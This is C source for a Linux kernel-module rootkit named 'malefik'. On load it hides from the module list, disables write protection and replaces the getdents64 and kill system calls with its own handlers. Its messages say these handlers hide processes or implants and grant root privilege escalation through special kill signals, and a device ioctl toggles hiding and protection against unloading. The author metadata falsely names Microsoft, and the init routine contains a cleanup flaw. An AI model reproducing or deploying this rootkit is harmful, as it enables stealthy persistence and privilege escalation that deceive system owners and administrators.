#include <linux/init.h>		
#include <linux/module.h>	
#include <linux/kernel.h>	
#include <linux/list.h>		
#include <linux/cred.h>		
#include <linux/fs.h>           
#include <linux/cdev.h>         
#include <linux/device.h>       
#include <linux/device/class.h> 
#include <linux/uaccess.h>      
#include <linux/ioctl.h>        

#include "include/hide_show_helper.h"
#include "include/hook_syscall_helper.h"

#define WR_VALUE _IOW('a','a',int32_t*)
#define RD_VALUE _IOR('a','b',int32_t*)
#define MAX_LIMIT 20
#define ROOTKIT_HIDE "hide"		  
#define ROOTKIT_SHOW "show"		  
#define ROOTKIT_PROTECT "protect"	
#define ROOTKIT_REMOVE "remove"		
#define PROCESS "process"		
#define ROOT "root"			

char value[MAX_LIMIT];

dev_t dev = 0;
static struct class *dev_class;
static struct cdev etx_cdev;

static int      __init malefik_init(void);
static void     __exit malefik_exit(void);
static int      etx_open(struct inode *inode, struct file *file);
static int      etx_release(struct inode *inode, struct file *file);
static ssize_t  etx_read(struct file *filp, char __user *buf, size_t len,loff_t *off);
static ssize_t  etx_write(struct file *filp, const char *buf, size_t len, loff_t *off);
static long     etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
static void	malefik_hide(void);
static void	malefik_show(void);
static void 	protect_rootkit(void);
static void 	remove_rootkit(void);

static struct file_operations fops =
{
	.owner          = THIS_MODULE,
	.read           = etx_read,
	.write          = etx_write,
	.open           = etx_open,
	.unlocked_ioctl = etx_ioctl,
	.release        = etx_release,
};

static void malefik_hide(void)
{
        proc_lsmod_malefik_hide();	
}

static void malefik_show(void)
{
        proc_lsmod_malefik_show();
}

static int etx_open(struct inode *inode, struct file *file)
{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ device file opened...\n");
        return 0;
}

static int etx_release(struct inode *inode, struct file *file)
{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~  device file closed...\n");
        return 0;
}

static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t *off)
{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ 		read function\n");
        return 0;
}

static ssize_t etx_write(struct file *filp, const char __user *buf, size_t len, loff_t *off)
{
        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ 		write function\n");
        return len;
}

static int is_protected = 0;
static void protect_rootkit(void)
{
	if (is_protected == 0)
	{
		try_module_get(THIS_MODULE);
		is_protected = 1;
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT MODE -> ON\n");
	}
}

static void remove_rootkit(void)
{
	if (is_protected == 1)
	{
		module_put(THIS_MODULE);
		is_protected = 0;
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT MODE -> OFF\n");
	}
}

static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
        switch(cmd) {
                case WR_VALUE:
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
                        {
                                pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ data write: Err!\n");
                        }
			pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ 		value from device file= %s\n", value);

			if (strncmp(ROOTKIT_HIDE, value, strlen(ROOTKIT_HIDE)) == 0)
                        {
				malefik_hide();
                        }
                        else if (strncmp(ROOTKIT_SHOW, value, strlen(ROOTKIT_SHOW)) == 0)
                        {
				malefik_show();
                        }
			else if (strncmp(ROOTKIT_PROTECT, value, strlen(ROOTKIT_PROTECT)) == 0)
			{
				protect_rootkit();
			}
			else if (strncmp(ROOTKIT_REMOVE, value, strlen(ROOTKIT_REMOVE)) == 0)
                        {
				remove_rootkit();
			}
			else if (strncmp(PROCESS, value, strlen(PROCESS)) == 0)
			{
				pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ kill -31 <pid>: hide/unhide running process/implant.\n");
			}
			else if (strncmp(ROOT, value, strlen(ROOT)) == 0)
			{
				pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ kill -64 <any pid>: privesc.\n");
			}
			else
			{
				pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ command: out of syllabus");
                        }
                        break;
                case RD_VALUE:                        
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT ))
                        {
                                pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ data read: Err!\n");
                        }
                        break;
                default:
                        pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ default\n");
                        break;
        }
        return 0;
}



static int __init malefik_init(void)
{
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~  LKM loaded \n");

	malefik_hide();

	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;

	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table kernel memory address: 0x%px \n", __sys_call_table);

	cr0 = read_cr0();
	
	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
	protect_memory();
	
	if((alloc_chrdev_region(&dev, 0, 1, "etx_Dev")) < 0)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ cannot allocate major number\n");
		return -1;
        }
        pr_info("Major = %d Minor = %d \n",MAJOR(dev), MINOR(dev));

	cdev_init(&etx_cdev,&fops);

	if((cdev_add(&etx_cdev,dev,1)) < 0)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ cannot add the device to the system\n");
		goto r_class;
        }

	if((dev_class = class_create(THIS_MODULE,"etx_class")) == NULL)
	{
		pr_err("ᛗᚨᛚᛖᚠᛁᚴ ~ cannot create the struct class\n");
		goto r_class;
        }

	class_destroy(dev_class);

r_class:
	unregister_chrdev_region(dev,1);
	return -1;
}

static void __exit malefik_exit(void)
{
	unprotect_memory();
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ setting sys_call_table to default...");

	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();

	device_destroy(dev_class,dev);
        class_destroy(dev_class);
        cdev_del(&etx_cdev);
        unregister_chrdev_region(dev, 1);
        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ unregistering the character device \n");

	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM unloaded \n");
}

module_init(malefik_init);
module_exit(malefik_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Microsoft");
MODULE_DESCRIPTION("fuck you linus");
MODULE_VERSION("6.6.6");
